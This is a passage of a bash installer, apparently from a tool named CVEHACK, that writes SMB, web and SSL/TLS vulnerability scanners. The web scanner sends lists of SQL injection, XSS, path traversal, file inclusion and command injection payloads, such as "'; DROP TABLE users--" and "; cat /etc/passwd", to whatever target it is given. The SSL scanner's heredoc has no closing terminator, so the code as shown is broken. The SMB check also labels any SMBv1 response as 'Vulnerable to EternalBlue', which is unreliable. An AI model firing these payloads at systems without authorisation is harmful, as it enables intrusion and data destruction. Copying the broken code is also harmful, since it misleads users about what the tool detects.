    chmod +x "$scanner_file"
    print_success "Shellshock scanner created: $scanner_file"
}

# Create SMB vulnerability scanner from scratch
create_smb_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/smb_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom SMB Vulnerability Scanner - Built from Scratch
# Tests for EternalBlue (CVE-2017-0144) and SMBGhost (CVE-2020-0796)
# No external tools required - Pure bash implementation
# ============================================================================

CVE_ETERNALBLUE="CVE-2017-0144"
CVE_SMBGHOST="CVE-2020-0796"
DESCRIPTION="SMB Protocol Vulnerabilities"
SEVERITY="CRITICAL"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_smb_vulnerabilities() {
    local target="$1"
    local port="${2:-445}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                        SMB Vulnerability Scanner                             ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target:$port"
    print_info "Testing for: EternalBlue, SMBGhost, SMBv1"
    echo ""
    
    # Test SMB port accessibility
    test_smb_port "$target" "$port"
    
    # Test for SMBv1 (EternalBlue)
    test_smbv1 "$target" "$port"
    
    # Test for SMBv3 compression (SMBGhost)
    test_smbv3_compression "$target" "$port"
    
    print_info "SMB vulnerability scan completed"
}

test_smb_port() {
    local target="$1"
    local port="$2"
    
    print_info "Testing SMB port accessibility..."
    
    if command -v nc &> /dev/null; then
        if nc -z -w 3 "$target" "$port" 2>/dev/null; then
            print_success "SMB port $port is open"
            return 0
        else
            print_error "SMB port $port is closed or filtered"
            return 1
        fi
    elif [[ -e /dev/tcp ]]; then
        if exec 3<>"/dev/tcp/$target/$port" 2>/dev/null; then
            print_success "SMB port $port is open"
            exec 3>&-
            return 0
        else
            print_error "SMB port $port is closed or filtered"
            return 1
        fi
    else
        print_warning "Cannot test port accessibility - no netcat or /dev/tcp"
        return 1
    fi
}

test_smbv1() {
    local target="$1"
    local port="$2"
    
    print_info "Testing for SMBv1 (EternalBlue vulnerability)..."
    
    # SMB Negotiate Protocol Request for SMBv1
    local smb_negotiate="\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"
    
    if command -v nc &> /dev/null; then
        local response=$(echo -ne "$smb_negotiate" | nc -w 3 "$target" "$port" 2>/dev/null | xxd -p 2>/dev/null)
        if [[ -n "$response" ]] && echo "$response" | grep -q "ff534d42"; then
            print_error "SMBv1 is ENABLED - Vulnerable to EternalBlue ($CVE_ETERNALBLUE)"
        else
            print_success "SMBv1 appears to be disabled"
        fi
    elif [[ -e /dev/tcp ]]; then
        if exec 3<>"/dev/tcp/$target/$port" 2>/dev/null; then
            echo -ne "$smb_negotiate" >&3
            local response=$(cat <&3 2>/dev/null | head -c 100)
            exec 3>&-
            if [[ -n "$response" ]]; then
                print_warning "SMB service detected - manual verification needed for SMBv1"
            fi
        fi
    fi
}

test_smbv3_compression() {
    local target="$1"
    local port="$2"
    
    print_info "Testing for SMBv3 compression (SMBGhost vulnerability)..."
    
    # This is a simplified test - real SMBGhost detection requires more complex SMB packet crafting
    print_warning "SMBGhost detection requires advanced packet crafting"
    print_info "Manual verification recommended for Windows 10 v1903/v1909 systems"
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_smb_vulnerabilities "$1" "$2"
fi
EOF

    chmod +x "$scanner_file"
    print_success "SMB scanner created: $scanner_file"
}

# Create web vulnerability scanner from scratch
create_web_vuln_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/web_vuln_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom Web Vulnerability Scanner - Built from Scratch
# Tests for common web vulnerabilities without external tools
# ============================================================================

DESCRIPTION="Custom Web Vulnerability Scanner"
SEVERITY="VARIES"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_web_vulnerabilities() {
    local target="$1"
    local port="${2:-80}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    # Ensure target has protocol
    if [[ ! "$target" =~ ^https?:// ]]; then
        if [[ "$port" == "443" ]]; then
            target="https://$target"
        else
            target="http://$target"
        fi
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                      Web Vulnerability Scanner                               ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target"
    echo ""
    
    # Test basic connectivity
    test_connectivity "$target"
    
    # Test for common vulnerabilities
    test_sql_injection "$target"
    test_xss_vulnerabilities "$target"
    test_directory_traversal "$target"
    test_file_inclusion "$target"
    test_command_injection "$target"
    
    print_info "Web vulnerability scan completed"
}

test_connectivity() {
    local target="$1"
    
    print_info "Testing basic connectivity..."
    
    if command -v curl &> /dev/null; then
        local response=$(curl -s -I --connect-timeout 5 "$target" 2>/dev/null)
        if [[ -n "$response" ]]; then
            print_success "Target is reachable"
            
            # Extract server information
            local server=$(echo "$response" | grep -i "server:" | cut -d: -f2- | xargs)
            if [[ -n "$server" ]]; then
                print_info "Server: $server"
            fi
            
            # Check for security headers
            check_security_headers "$response"
        else
            print_error "Target is not reachable"
            return 1
        fi
    else
        print_warning "curl not available - skipping connectivity test"
    fi
}

check_security_headers() {
    local headers="$1"
    
    print_info "Checking security headers..."
    
    # Check for missing security headers
    if ! echo "$headers" | grep -qi "x-frame-options"; then
        print_warning "Missing X-Frame-Options header (Clickjacking risk)"
    fi
    
    if ! echo "$headers" | grep -qi "x-xss-protection"; then
        print_warning "Missing X-XSS-Protection header"
    fi
    
    if ! echo "$headers" | grep -qi "x-content-type-options"; then
        print_warning "Missing X-Content-Type-Options header"
    fi
    
    if ! echo "$headers" | grep -qi "strict-transport-security"; then
        print_warning "Missing Strict-Transport-Security header"
    fi
}

test_sql_injection() {
    local target="$1"
    
    print_info "Testing for SQL injection vulnerabilities..."
    
    local sql_payloads=(
        "'"
        "' OR '1'='1"
        "' OR 1=1--"
        "'; DROP TABLE users--"
        "' UNION SELECT 1,2,3--"
    )
    
    local test_params=(
        "id"
        "user"
        "search"
        "q"
        "category"
    )
    
    for param in "${test_params[@]}"; do
        for payload in "${sql_payloads[@]}"; do
            local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
            local test_url="$target/?$param=$encoded_payload"
            
            if command -v curl &> /dev/null; then
                local response=$(curl -s --connect-timeout 3 "$test_url" 2>/dev/null)
                
                # Check for SQL error messages
                if echo "$response" | grep -qi "mysql\|postgresql\|oracle\|sql syntax\|sqlite"; then
                    print_error "Potential SQL injection found: $param parameter"
                    break
                fi
            fi
        done
    done
}

test_xss_vulnerabilities() {
    local target="$1"
    
    print_info "Testing for XSS vulnerabilities..."
    
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
        "<svg onload=alert('XSS')>"
    )
    
    local test_params=(
        "q"
        "search"
        "name"
        "comment"
        "message"
    )
    
    for param in "${test_params[@]}"; do
        for payload in "${xss_payloads[@]}"; do
            local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
            local test_url="$target/?$param=$encoded_payload"
            
            if command -v curl &> /dev/null; then
                local response=$(curl -s --connect-timeout 3 "$test_url" 2>/dev/null)
                
                # Check if payload is reflected
                if echo "$response" | grep -q "alert('XSS')"; then
                    print_error "Potential XSS vulnerability found: $param parameter"
                    break
                fi
            fi
        done
    done
}

test_directory_traversal() {
    local target="$1"
    
    print_info "Testing for directory traversal vulnerabilities..."
    
    local traversal_payloads=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    )
    
    for payload in "${traversal_payloads[@]}"; do
        local test_url="$target/?file=$payload"
        
        if command -v curl &> /dev/null; then
            local response=$(curl -s --connect-timeout 3 "$test_url" 2>/dev/null)
            
            # Check for system file contents
            if echo "$response" | grep -q "root:\|daemon:\|Administrator"; then
                print_error "Potential directory traversal vulnerability found"
                break
            fi
        fi
    done
}

test_file_inclusion() {
    local target="$1"
    
    print_info "Testing for file inclusion vulnerabilities..."
    
    local lfi_payloads=(
        "/etc/passwd"
        "/proc/version"
        "/etc/hosts"
        "C:\\windows\\system32\\drivers\\etc\\hosts"
    )
    
    for payload in "${lfi_payloads[@]}"; do
        local test_url="$target/?page=$payload"
        
        if command -v curl &> /dev/null; then
            local response=$(curl -s --connect-timeout 3 "$test_url" 2>/dev/null)
            
            # Check for file inclusion indicators
            if echo "$response" | grep -q "root:\|Linux version\|localhost"; then
                print_error "Potential local file inclusion vulnerability found"
                break
            fi
        fi
    done
}

test_command_injection() {
    local target="$1"
    
    print_info "Testing for command injection vulnerabilities..."
    
    local cmd_payloads=(
        "; id"
        "| whoami"
        "&& uname -a"
        "; cat /etc/passwd"
    )
    
    local test_params=(
        "cmd"
        "exec"
        "system"
        "ping"
    )
    
    for param in "${test_params[@]}"; do
        for payload in "${cmd_payloads[@]}"; do
            local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/;/%3B/g')
            local test_url="$target/?$param=test$encoded_payload"
            
            if command -v curl &> /dev/null; then
                local response=$(curl -s --connect-timeout 3 "$test_url" 2>/dev/null)
                
                # Check for command execution indicators
                if echo "$response" | grep -q "uid=\|gid=\|Linux\|Windows"; then
                    print_error "Potential command injection vulnerability found: $param parameter"
                    break
                fi
            fi
        done
    done
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_web_vulnerabilities "$1" "$2"
fi
EOF

    chmod +x "$scanner_file"
    print_success "Web vulnerability scanner created: $scanner_file"
}

# Create SSL/TLS scanner from scratch
create_ssl_scanner() {
    local scanner_file="$CVE_TOOLS_DIR/ssl_scanner.sh"
    
    cat > "$scanner_file" << 'EOF'
#!/bin/bash

# ============================================================================
# Custom SSL/TLS Vulnerability Scanner - Built from Scratch
# Tests for Heartbleed, POODLE, and other SSL/TLS vulnerabilities
# ============================================================================

CVE_HEARTBLEED="CVE-2014-0160"
CVE_POODLE="CVE-2014-3566"
DESCRIPTION="SSL/TLS Vulnerability Scanner"
SEVERITY="VARIES"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
    source "$SCRIPT_DIR/../../lib/logger.sh"
else
    # Fallback color definitions
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_ssl_vulnerabilities() {
    local target="$1"
    local port="${2:-443}"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target> [port]"
        exit 1
    fi
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                       SSL/TLS Vulnerability Scanner                          ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    print_info "Target: $target:$port"
    echo ""
    
    # Test SSL/TLS connectivity
    test_ssl_connectivity "$target" "$port"
    
    # Test for supported protocols
    test_ssl_protocols "$target" "$port"
    
    # Test for weak ciphers
    test_weak_ciphers "$target" "$port"
    
    # Test certificate information
    test_certificate_info "$target" "$port"
    
    print_info "SSL/TLS vulnerability scan completed"
}

test_ssl_connectivity() {
    local target="$1"
    local port="$2"
    
    print_info "Testing SSL/TLS connectivity..."
    
    if command -v openssl &> /dev/null; then
        local ssl_info=$(echo | openssl s_client -connect "$target:$port" -servername "$target" 2>/dev/null)
        
        if echo "$ssl_info" | grep -q "CONNECTED"; then
            print_success "SSL/TLS connection established"
            
            # Extract SSL version
            local ssl_version=$(echo "$ssl_info" | grep "Protocol" | awk '{print $3}')
            if [[ -n "$ssl_version" ]]; then
                print_info "SSL/TLS Version: $ssl_version"
            fi
        else
            print_error "Failed to establish SSL/TLS connection"
            return 1
        fi
    else
        print_warning "OpenSSL not available - using basic connectivity test"
        
        if command -v nc &> /dev/null; then
            if nc -z -w 3 "$target" "$port" 2>/dev/null; then
                print_success "Port $port is open (likely SSL/TLS)"
            else
                print_error "Port $port is closed or filtered"
                return 1
            fi
        fi
    fi
}

test_ssl_protocols() {
    local target="$1"
    local port="$2"
    
    print_info "Testing supported SSL/TLS protocols..."
    
    if command -v openssl &> /dev/null; then
        # Test for SSLv3 (POODLE vulnerability)
        if echo | openssl s_client -ssl3 -connect "$target:$port" 2>/dev/null | grep -q "CONNECTED"; then
            print_error "SSLv3 is supported - Vulnerable to POODLE (CVE-2014-3566)"
        fi
        
        # Test for TLSv1.0 (deprecated)
        if echo | openssl s_client -tls1 -connect "$target:$port" 2>/dev/null | grep -q "CONNECTED"; then
            print_warning "TLSv1.0 is supported - Consider disabling"
        fi
        
        # Test for TLSv1.2 (good)
        if echo | openssl s_client -tls1_2 -connect "$target:$port" 2>/dev/null | grep -q "CONNECTED"; then
            print_success "TLSv1.2 is supported"
        fi
    else
        print_warning "OpenSSL not available - cannot test SSL/TLS protocols"
    fi
}

test_weak_ciphers() {
    local target="$1"
    local port="$2"
    
    print_info "Testing for weak ciphers..."
    
    if command -v openssl &> /dev/null; then
        # Test for weak cipher suites
        local weak_ciphers=(
            "DES-CBC-SHA"
            "RC4-MD5"
            "RC4-SHA"
            "NULL-MD5"
            "NULL-SHA"
        )
        
        for cipher in "${weak_ciphers[@]}"; do
            if echo | openssl s_client -cipher "$cipher" -connect "$target:$port" 2>/dev/null | grep -q "CONNECTED"; then
                print_error "Weak cipher supported: $cipher"
            fi
        done
    else
        print_warning "OpenSSL not available - cannot test cipher suites"
    fi
}

test_certificate_info() {
    local target="$1"
    local port="$2"
    
    print_info "Checking certificate information..."
    
    if command -v openssl &> /dev/null; then
        local cert_info=$(echo | openssl s_client -connect "$target:$port" -servername "$target" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
        
        if [[ -n "$cert_info" ]]; then
            # Check certificate expiration
            local expiry=$(echo | openssl s_client -connect "$target:$port" -servername "$target" 2>/dev/null | openssl x509 -noout -dates 2>/dev/null | grep "notAfter")
            if [[ -n "$expiry" ]]; then
                print_info "Certificate expiry: ${expiry#*=}"
            fi
        else
            print_warning "Could not retrieve certificate information"
        fi
    else
        print_warning "OpenSSL not available - cannot check certificate"
    fi
}

# Check if script is being executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_ssl_vulnerabilities "$1" "$2"
fi


    chmod +x "$scanner_file"
    print_success "SSL/TLS scanner created: $scanner_file"
}
